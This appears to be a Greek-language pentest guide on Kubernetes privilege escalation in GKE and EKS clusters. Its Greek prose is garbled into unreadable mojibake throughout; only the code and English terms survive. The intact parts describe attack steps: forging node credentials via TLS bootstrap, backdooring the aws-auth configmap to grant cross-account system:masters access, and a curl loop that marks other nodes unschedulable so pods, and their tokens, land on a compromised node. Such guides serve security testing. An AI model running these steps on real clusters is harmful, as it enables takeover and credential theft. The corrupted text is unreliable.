Î£Ï„Î¿ [**Î±Ï…Ï„ÏŒ Ï„Î¿ Î¬ÏÎ¸ÏÎ¿**](https://www.4armed.com/blog/hacking-kubelet-on-gke/) ÎºÎ±Î¹ [**ÏƒÎµ Î±Ï…Ï„ÏŒ**](https://rhinosecuritylabs.com/cloud-security/kubelet-tls-bootstrap-privilege-escalation/) Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· TLS Bootstrap Ï„Î¿Ï… GKE K8s ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î· Î¼Îµ **Î±Ï…Ï„ÏŒÎ¼Î±Ï„Î· Ï…Ï€Î¿Î³ÏÎ±Ï†Î®** ÎºÎ±Î¹ ÎºÎ±Ï„Î±Ï‡ÏÎ¬Ï„Î±Î¹ Î³Î¹Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± ÎµÎ½ÏŒÏ‚ Î½Î­Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï… K8s ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± Ï„Î± ÎºÎ±Ï„Î±Ï‡ÏÎ±ÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎµÎ¹ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± ÎºÎ»Î­Î²Î¿Î½Ï„Î±Ï‚ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬.\
Î‘Î½ **Î­Ï‡ÎµÏ„Îµ Ï„Î± Î±Î½Î±Ï†ÎµÏÏŒÎ¼ÎµÎ½Î± Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÎºÎ¬Î½ÎµÏ„Îµ Ï„Î¿ Î¯Î´Î¹Î¿**. Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Ï„Î¿ Ï€ÏÏÏ„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„ÎµÎ¹ Ï„Î¿ ÏƒÏ†Î¬Î»Î¼Î± Ï€Î¿Ï… ÎµÎ¼Ï€Î¿Î´Î¯Î¶ÎµÎ¹ Î­Î½Î±Î½ Î½Î­Î¿ ÎºÏŒÎ¼Î²Î¿ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î¼Î­ÏƒÎ± ÏƒÎµ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ, ÎµÏ€ÎµÎ¹Î´Î® Î­Î½Î±Ï‚ **ÎºÏŒÎ¼Î²Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¼ÏŒÎ½Î¿ ÏƒÏ„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Ï„Ï‰Î½ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î·Î¼Î­Î½Î± ÏƒÎµ Î±Ï…Ï„ÏŒÎ½.**

ÎŸ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Î±Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î»ÏÏ‚ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± ÎºÏŒÎ¼Î²Î¿Ï… Î³Î¹Î± Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï… ÏŒÏ€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î·Î¼Î­Î½Î¿ Ï„Î¿ ÎºÎ¿Î½Ï„Î­Î¹Î½ÎµÏ Î¼Îµ Ï„Î± ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬** (Î±Î»Î»Î¬ Î±Ï€Î»ÏÏ‚ ÎµÎ»Î­Î³Î¾Ï„Îµ Ï€ÏÏ‚ Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ ÏƒÏ„Î¿ Ï€ÏÏÏ„Î¿ Î¬ÏÎ¸ÏÎ¿):
```bash
"/O=system:nodes/CN=system:node:gke-cluster19-default-pool-6c73b1-8cj1"
```
### AWS EKS aws-auth configmaps

ÎŸÎ¹ Ï†Î¿ÏÎµÎ¯Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½ **`configmaps`** ÏƒÏ„Î¿ namespace kube-system ÏƒÎµ EKS (Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ AWS) clusters Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î½ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î± Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¹ÏƒÏ„Î® Ï„Î¿Ï… cluster Î±Î½Ï„Î¹ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î¿ **aws-auth** configmap.\
ÎŸÎ¹ ÏÎ®Ï„ÏÎµÏ‚ Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ ÎµÎ¯Î½Î±Î¹ **`update`** ÎºÎ±Î¹ **`patch`**, Î® **`create`** Î±Î½ Ï„Î¿ configmap Î´ÎµÎ½ Î­Ï‡ÎµÎ¹ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¸ÎµÎ¯:

{% code overflow="wrap" %}
```bash
# Check if config map exists
get configmap aws-auth -n kube-system -o yaml

## Yaml example
apiVersion: v1
kind: ConfigMap
metadata:
name: aws-auth
namespace: kube-system
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters

# Create donfig map is doesn't exist
## Using kubectl and the previous yaml
kubectl apply -f /tmp/aws-auth.yaml
## Using eksctl
eksctl create iamidentitymapping --cluster Testing --region us-east-1 --arn arn:aws:iam::123456789098:role/SomeRoleTestName --group "system:masters" --no-duplicate-arns

# Modify it
kubectl edit -n kube-system configmap/aws-auth
## You can modify it to even give access to users from other accounts
data:
mapRoles: |
- rolearn: arn:aws:iam::123456789098:role/SomeRoleTestName
username: system:node:{{EC2PrivateDNSName}}
groups:
- system:masters
mapUsers: |
- userarn: arn:aws:iam::098765432123:user/SomeUserTestName
username: admin
groups:
- system:masters
```
{% endcode %}

{% hint style="warning" %}
ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ **`aws-auth`** Î³Î¹Î± **persistency** Î´Î¯Î½Î¿Î½Ï„Î±Ï‚ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î±Ï€ÏŒ **Î¬Î»Î»Î¿Ï…Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿ÏÏ‚**.

Î©ÏƒÏ„ÏŒÏƒÎ¿, `aws --profile other_account eks update-kubeconfig --name <cluster-name>` **Î´ÎµÎ½ Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î±Ï€ÏŒ Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ**. Î‘Î»Î»Î¬ ÏƒÏ„Î·Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¹ÎºÏŒÏ„Î·Ï„Î±, `aws --profile other_account eks get-token --cluster-name arn:aws:eks:us-east-1:123456789098:cluster/Testing` Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³ÎµÎ¯ Î±Î½ Î²Î¬Î»ÎµÏ„Îµ Ï„Î¿ ARN Ï„Î¿Ï… cluster Î±Î½Ï„Î¯ Î³Î¹Î± Î±Ï€Î»ÏÏ‚ Ï„Î¿ ÏŒÎ½Î¿Î¼Î±.\
Î“Î¹Î± Î½Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï„Î¿ `kubectl`, Î±Ï€Î»ÏÏ‚ Î²ÎµÎ²Î±Î¹Ï‰Î¸ÎµÎ¯Ï„Îµ ÏŒÏ„Î¹ Î­Ï‡ÎµÏ„Îµ **ÏÏ…Î¸Î¼Î¯ÏƒÎµÎ¹** Ï„Î¿ **kubeconfig Ï„Î¿Ï… Î¸ÏÎ¼Î±Ï„Î¿Ï‚** ÎºÎ±Î¹ ÏƒÏ„Î± args ÎµÎºÏ„Î­Î»ÎµÏƒÎ·Ï‚ Ï„Î¿Ï… aws Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ `--profile other_account_role` ÏÏƒÏ„Îµ Ï„Î¿ kubectl Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ Ï€ÏÎ¿Ï†Î¯Î» Ï„Î¿Ï… Î¬Î»Î»Î¿Ï… Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼Î¿Ï Î³Î¹Î± Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÎ¹ Ï„Î¿ token ÎºÎ±Î¹ Î½Î± ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î®ÏƒÎµÎ¹ Î¼Îµ Ï„Î¿ AWS.
{% endhint %}

### ÎšÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ· ÏƒÏ„Î¿ GKE

Î¥Ï€Î¬ÏÏ‡Î¿Ï…Î½ **2 Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Î±Î½Î±Ï„ÎµÎ¸Î¿ÏÎ½ Î¬Î´ÎµÎ¹ÎµÏ‚ K8s ÏƒÎµ GCP principals**. Î£Îµ ÎºÎ¬Î¸Îµ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î¿ principal Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ ÎµÏ€Î¯ÏƒÎ·Ï‚ Ï„Î·Î½ Î¬Î´ÎµÎ¹Î± **`container.clusters.get`** Î³Î¹Î± Î½Î± Î¼Ï€Î¿ÏÎ­ÏƒÎµÎ¹ Î½Î± ÏƒÏ…Î³ÎºÎµÎ½Ï„ÏÏÏƒÎµÎ¹ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î³Î¹Î± Î½Î± Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ cluster, Î±Î»Î»Î¹ÏÏ‚ Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Ï„Î¿ Î´Î¹ÎºÏŒ Ï„Î¿Ï… Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ kubectl** (Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ Ï„Î¿Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î¿ ÏƒÏÎ½Î´ÎµÏƒÎ¼Î¿).

{% hint style="warning" %}
ÎŒÏ„Î±Î½ Î¼Î¹Î»Î¬Ï„Îµ Î¼Îµ Ï„Î¿ K8s api endpoint, Ï„Î¿ **GCP auth token Î¸Î± ÏƒÏ„Î±Î»ÎµÎ¯**. Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Ï„Î¿ GCP, Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… K8s api endpoint, Î¸Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Ï€ÏÏÏ„Î± Î±Î½ Î¿ **principal** (Î¼Îµ email) **Î­Ï‡ÎµÎ¹ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ cluster**, ÎºÎ±Î¹ Î¼ÎµÏ„Î¬ Î¸Î± ÎµÎ»Î­Î³Î¾ÎµÎ¹ Î±Î½ Î­Ï‡ÎµÎ¹ **Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· Î¼Î­ÏƒÏ‰ GCP IAM**.\
Î‘Î½ **Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ** Î±Ï€ÏŒ Î±Ï…Ï„Î¬ ÎµÎ¯Î½Î±Î¹ **Î±Î»Î·Î¸Î¹Î½ÏŒ**, Î¸Î± **Î±Ï€Î±Î½Ï„Î·Î¸ÎµÎ¯**. Î‘Î½ **ÏŒÏ‡Î¹**, Î¸Î± Î´Î¿Î¸ÎµÎ¯ Î­Î½Î± **ÏƒÏ†Î¬Î»Î¼Î±** Ï€Î¿Ï… Ï€ÏÎ¿Ï„ÎµÎ¯Î½ÎµÎ¹ Î½Î± Î´Î¿Î¸Î¿ÏÎ½ **Î¬Î´ÎµÎ¹ÎµÏ‚ Î¼Î­ÏƒÏ‰ GCP IAM**.
{% endhint %}

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î±, Î· Ï€ÏÏÏ„Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ Î· Ï‡ÏÎ®ÏƒÎ· **GCP IAM**, Î¿Î¹ Î¬Î´ÎµÎ¹ÎµÏ‚ K8s Î­Ï‡Î¿Ï…Î½ Ï„Î¹Ï‚ **Î¹ÏƒÎ¿Î´ÏÎ½Î±Î¼ÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ GCP IAM**, ÎºÎ±Î¹ Î±Î½ Î¿ principal Ï„Î¹Ï‚ Î­Ï‡ÎµÎ¹, Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î¹Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹.

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md" %}
[gcp-container-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-container-privesc.md)
{% endcontent-ref %}

Î— Î´ÎµÏÏ„ÎµÏÎ· Î¼Î­Î¸Î¿Î´Î¿Ï‚ ÎµÎ¯Î½Î±Î¹ **Î· Î±Î½Î¬Î¸ÎµÏƒÎ· Î±Î´ÎµÎ¹ÏÎ½ K8s Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ cluster** Î±Î½Î±Î³Î½Ï‰ÏÎ¯Î¶Î¿Î½Ï„Î±Ï‚ Ï„Î¿Î½ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… **email** Ï„Î¿Ï… (ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î±Î½Î¿Î¼Î­Î½Ï‰Î½ Ï„Ï‰Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏÎ½ Ï…Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ GCP).

### Î”Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± token serviceaccounts

Principals Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½ TokenRequests** (`serviceaccounts/token`) ÏŒÏ„Î±Î½ Î¼Î¹Î»Î¿ÏÎ½ Î¼Îµ Ï„Î¿ K8s api endpoint SAs (Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±Ï€ÏŒ [**ÎµÎ´Ï**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/token_request.rego)).

### ephemeralcontainers

Principals Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **`update`** Î® **`patch`** **`pods/ephemeralcontainers`** Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎ¿Ï…Î½ **ÎµÎºÏ„Î­Î»ÎµÏƒÎ· ÎºÏÎ´Î¹ÎºÎ± ÏƒÎµ Î¬Î»Î»Î± pods**, ÎºÎ±Î¹ ÎµÎ½Î´ÎµÏ‡Î¿Î¼Î­Î½Ï‰Ï‚ Î½Î± **ÏƒÏ€Î¬ÏƒÎ¿Ï…Î½** ÏƒÏ„Î¿ node Ï„Î¿Ï…Ï‚ Ï€ÏÎ¿ÏƒÎ¸Î­Ï„Î¿Î½Ï„Î±Ï‚ Î­Î½Î± ephemeral container Î¼Îµ privileged securityContext.

### ValidatingWebhookConfigurations Î® MutatingWebhookConfigurations

Principals Î¼Îµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ Î±Ï€ÏŒ Ï„Î± ÏÎ®Î¼Î±Ï„Î± `create`, `update` Î® `patch` Ï€Î¬Î½Ï‰ ÏƒÎµ `validatingwebhookconfigurations` Î® `mutatingwebhookconfigurations` Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎ¿Ï…Î½ Î¼Î¯Î± Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ webhookconfigurations** Ï€ÏÎ¿ÎºÎµÎ¹Î¼Î­Î½Î¿Ï… Î½Î± Î¼Ï€Î¿ÏÎ­ÏƒÎ¿Ï…Î½ Î½Î± **ÎºÎ»Î¹Î¼Î±ÎºÏÏƒÎ¿Ï…Î½ Ï€ÏÎ¿Î½ÏŒÎ¼Î¹Î±**.

Î“Î¹Î± Î­Î½Î± [Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± `mutatingwebhookconfigurations` ÎµÎ»Î­Î³Î¾Ï„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± Ï„Î·Ï‚ Î±Î½Î¬ÏÏ„Î·ÏƒÎ·Ï‚](./#malicious-admission-controller).

### ÎšÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ·

ÎŒÏ€Ï‰Ï‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î¹Î±Î²Î¬ÏƒÎµÏ„Îµ ÏƒÏ„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î±: [**Î•Î½ÏƒÏ‰Î¼Î±Ï„Ï‰Î¼Î­Î½Î· Î ÏÏŒÎ»Î·ÏˆÎ· ÎšÎ»Î¹Î¼Î¬ÎºÏ‰ÏƒÎ·Ï‚ Î ÏÎ¿Î½Î¿Î¼Î¯Ï‰Î½**](./#built-in-privileged-escalation-prevention), Î­Î½Î±Ï‚ principal Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÎ¹ Î¿ÏÏ„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ ÏÏŒÎ»Î¿Ï…Ï‚ Î® clusterroles Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Î­Ï‡ÎµÎ¹ Î¿ Î¯Î´Î¹Î¿Ï‚ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î½Î­ÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚. Î•ÎºÏ„ÏŒÏ‚ Î±Î½ Î­Ï‡ÎµÎ¹ Ï„Î¿ **ÏÎ®Î¼Î± `escalate`** Ï€Î¬Î½Ï‰ ÏƒÎµ **`roles`** Î® **`clusterroles`**.\
Î¤ÏŒÏ„Îµ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ½Î·Î¼ÎµÏÏÏƒÎµÎ¹/Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î½Î­Î¿Ï…Ï‚ ÏÏŒÎ»Î¿Ï…Ï‚, clusterroles Î¼Îµ ÎºÎ±Î»ÏÏ„ÎµÏÎµÏ‚ Î¬Î´ÎµÎ¹ÎµÏ‚ Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚ Ï€Î¿Ï… Î­Ï‡ÎµÎ¹.

### Proxy ÎºÏŒÎ¼Î²Ï‰Î½

Principals Î¼Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ **`nodes/proxy`** Ï…Ï€Î¿Ï€ÏŒÏÎ¿ Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ ÎºÏÎ´Î¹ÎºÎ± ÏƒÎµ pods** Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… Kubelet API (ÏƒÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ [**Î±Ï…Ï„ÏŒ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/nodes_proxy.rego)). Î ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î·Î½ Î±Ï…Î¸ÎµÎ½Ï„Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ· Kubelet ÏƒÎµ Î±Ï…Ï„Î® Ï„Î· ÏƒÎµÎ»Î¯Î´Î±:

{% content-ref url="../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md" %}
[kubelet-authentication-and-authorization.md](../pentesting-kubernetes-services/kubelet-authentication-and-authorization.md)
{% endcontent-ref %}

ÎˆÏ‡ÎµÏ„Îµ Î­Î½Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î³Î¹Î± Ï„Î¿ Ï€ÏÏ‚ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ [**RCE Î¼Î¹Î»ÏÎ½Ï„Î±Ï‚ ÎµÎ¾Î¿Ï…ÏƒÎ¹Î¿Î´Î¿Ï„Î·Î¼Î­Î½Î± ÏƒÎµ Î­Î½Î± Kubelet API ÎµÎ´Ï**](../pentesting-kubernetes-services/#kubelet-rce).

### Î”Î¹Î±Î³ÏÎ±Ï†Î® pods + Î¼Î· Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹Î¶ÏŒÎ¼ÎµÎ½Î¿Î¹ ÎºÏŒÎ¼Î²Î¿Î¹

Principals Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **Î´Î¹Î±Î³ÏÎ¬ÏˆÎ¿Ï…Î½ pods** (`delete` ÏÎ®Î¼Î± Ï€Î¬Î½Ï‰ ÏƒÎµ `pods` Ï€ÏŒÏÎ¿), Î® **Î½Î± ÎµÎºÎ´Î¹ÏÎ¾Î¿Ï…Î½ pods** (`create` ÏÎ®Î¼Î± Ï€Î¬Î½Ï‰ ÏƒÎµ `pods/eviction` Ï€ÏŒÏÎ¿), Î® **Î½Î± Î±Î»Î»Î¬Î¾Î¿Ï…Î½ Ï„Î·Î½ ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Ï„Î¿Ï… pod** (Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ `pods/status`) ÎºÎ±Î¹ Î¼Ï€Î¿ÏÎ¿ÏÎ½ **Î½Î± ÎºÎ¬Î½Î¿Ï…Î½ Î¬Î»Î»Î¿Ï…Ï‚ ÎºÏŒÎ¼Î²Î¿Ï…Ï‚ Î¼Î· Ï€ÏÎ¿Î³ÏÎ±Î¼Î¼Î±Ï„Î¹Î¶ÏŒÎ¼ÎµÎ½Î¿Ï…Ï‚** (Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ `nodes/status`) Î® **Î½Î± Î´Î¹Î±Î³ÏÎ¬ÏˆÎ¿Ï…Î½ ÎºÏŒÎ¼Î²Î¿Ï…Ï‚** (`delete` ÏÎ®Î¼Î± Ï€Î¬Î½Ï‰ ÏƒÎµ `nodes` Ï€ÏŒÏÎ¿) ÎºÎ±Î¹ Î­Ï‡Î¿Ï…Î½ Î­Î»ÎµÎ³Ï‡Î¿ ÏƒÎµ Î­Î½Î± pod, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± **ÎºÎ»Î­ÏˆÎ¿Ï…Î½ pods Î±Ï€ÏŒ Î¬Î»Î»Î¿Ï…Ï‚ ÎºÏŒÎ¼Î²Î¿Ï…Ï‚** ÏÏƒÏ„Îµ Î½Î± **ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹** ÏƒÏ„Î¿Î½ **ÏƒÏ…Î¼Î²Î¹Î²Î±ÏƒÎ¼Î­Î½Î¿** **ÎºÏŒÎ¼Î²Î¿** ÎºÎ±Î¹ Î¿ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± **ÎºÎ»Î­ÏˆÎµÎ¹ Ï„Î± tokens** Î±Ï€ÏŒ Î±Ï…Ï„Î¬ Ï„Î± pods.

{% code overflow="wrap" %}
```bash
patch_node_capacity(){
curl -s -X PATCH 127.0.0.1:8001/api/v1/nodes/$1/status -H "Content-Type: json-patch+json" -d '[{"op": "replace", "path":"/status/allocatable/pods", "value": "0"}]'
}

while true; do patch_node_capacity <id_other_node>; done &
#Launch previous line with all the nodes you need to attack

kubectl delete pods -n kube-system <privileged_pod_name>
```
{% endcode %}

### ÎšÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· Î¥Ï€Î·ÏÎµÏƒÎ¹ÏÎ½ (CVE-2020-8554)

ÎŸÎ¹ ÎºÏÏÎ¹Î¿Î¹ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± **Ï„ÏÎ¿Ï€Î¿Ï€Î¿Î¹Î®ÏƒÎ¿Ï…Î½** **`services/status`** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÏÏ…Î¸Î¼Î¯ÏƒÎ¿Ï…Î½ Ï„Î¿ Ï€ÎµÎ´Î¯Î¿ `status.loadBalancer.ingress.ip` Î³Î¹Î± Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„Î¿ÏÎ½ Ï„Î¿ **Î¼Î· Î´Î¹Î¿ÏÎ¸Ï‰Î¼Î­Î½Î¿ CVE-2020-8554** ÎºÎ±Î¹ Î½Î± Î¾ÎµÎºÎ¹Î½Î®ÏƒÎ¿Ï…Î½ **MiTM ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ ÎºÎ±Ï„Î¬ Ï„Î¿Ï… clus**ter. ÎŸÎ¹ Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î¼ÎµÏ„ÏÎ®ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Ï„Î¿ CVE-2020-8554 Î±Ï€Î¿Ï„ÏÎ­Ï€Î¿Ï…Î½ Î¼ÏŒÎ½Î¿ Ï„Î¹Ï‚ Ï…Ï€Î·ÏÎµÏƒÎ¯ÎµÏ‚ ExternalIP (ÏƒÏÎ¼Ï†Ï‰Î½Î± Î¼Îµ [**Î±Ï…Ï„ÏŒ**](https://github.com/PaloAltoNetworks/rbac-police/blob/main/lib/modify\_service\_status\_cve\_2020\_8554.rego)).

### ÎšÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ· ÎšÏŒÎ¼Î²Ï‰Î½ ÎºÎ±Î¹ Pods

